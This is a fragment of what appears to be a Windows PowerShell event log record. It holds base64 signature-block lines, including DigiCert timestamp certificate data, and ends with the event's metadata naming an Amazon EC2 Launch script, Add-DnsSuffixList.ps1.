+# WWYEyrEBr1L5BHO6MxmD9DLl2ysotevtX8WVt5wsgfY2pbGYx8nqFKBVPBhW26p/
+# 33axLhgR8rNhhRRkU/W3uT1bW3x0sfssTaF6R3riQhrex27IJFPTLwOeJEQ5UhhE
+# IMdmXSQYEPHEQ4RqUTISJsMJ8KZrwktxpETj0cH3mSkmhFIiMpVwaQ633m5qoYIX
+# PTCCFzkGCisGAQQBgjcDAwExghcpMIIXJQYJKoZIhvcNAQcCoIIXFjCCFxICAQMx
+# DzANBglghkgBZQMEAgEFADB3BgsqhkiG9w0BCRABBKBoBGYwZAIBAQYJYIZIAYb9
+# bAcBMDEwDQYJYIZIAWUDBAIBBQAEIHZBTdEg6m7H1JWYSgkwZqZJca9sn4GAr8Tv
+# //NRYrMmAhBBWvl/ekQTLH0fNK1QEpn/GA8yMDIyMTIyNDA5MjMyNlqgghMHMIIG
+# wDCCBKigAwIBAgIQDE1pckuU+jwqSj0pB4A9WjANBgkqhkiG9w0BAQsFADBjMQsw
+# CQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQsIEluYy4xOzA5BgNVBAMTMkRp
+# Z2lDZXJ0IFRydXN0ZWQgRzQgUlNBNDA5NiBTSEEyNTYgVGltZVN0YW1waW5nIENB
+# MB4XDTIyMDkyMTAwMDAwMFoXDTMzMTEyMTIzNTk1OVowRjELMAkGA1UEBhMCVVMx
+# ETAPBgNVBAoTCERpZ2lDZXJ0MSQwIgYDVQQDExtEaWdpQ2VydCBUaW1lc3RhbXAg
+# MjAyMiAtIDIwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDP7KUmOsap
+# 8mu7jcENmtuh6BSFdDMaJqzQHFUeHjZtvJJVDGH0nQl3PRWWCC9rZKT9BoMW15GS
+# OBwxApb7crGXOlWvM+xhiummKNuQY1y9iVPgOi2Mh0KuJqTku3h4uXoW4VbGwLpk
+# U7sqFudQSLuIaQyIxvG+4C99O7HKU41Agx7ny3JJKB5MgB6FVueF7fJhvKo6B332
+# q27lZt3iXPUv7Y3UTZWEaOOAy2p50dIQkUYp6z4m8rSMzUy5Zsi7qlA4DeWMlF0Z
+# Wr/1e0BubxaompyVR4aFeT4MXmaMGgokvpyq0py2909ueMQoP6McD1AGN7oI2TWm
+# tR7aeFgdOej4TJEQln5N4d3CraV++C0bH+wrRhijGfY59/XBT3EuiQMRoku7mL/6
+# T+R7Nu8GRORV/zbq5Xwx5/PCUsTmFntafqUlc9vAapkhLWPlWfVNL5AfJ7fSqxTl
+# OGaHUQhr+1NDOdBk+lbP4PQK5hRtZHi7mP2Uw3Mh8y/CLiDXgazT8QfU4b3ZXUtu
+# MZQpi+ZBpGWUwFjl5S4pkKa3YWT62SBsGFFguqaBDwklU/G/O+mrBw5qBzliGcnW
+# hX8T2Y15z2LF7OF7ucxnEweawXjtxojIsG4yeccLWYONxu71LHx7jstkifGxxLjn
+# U15fVdJ9GSlZA076XepFcxyEftfO4tQ6dwIDAQABo4IBizCCAYcwDgYDVR0PAQH/
+# BAQDAgeAMAwGA1UdEwEB/wQCMAAwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwIAYD
+# VR0gBBkwFzAIBgZngQwBBAIwC</Data><Data Name='ScriptBlockId'>03f28ea5-d179-4890-afff-fad8e6c7fb0c</Data><Data Name='Path'>C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Add-DnsSuffixList.ps1</Data></EventData></Event>
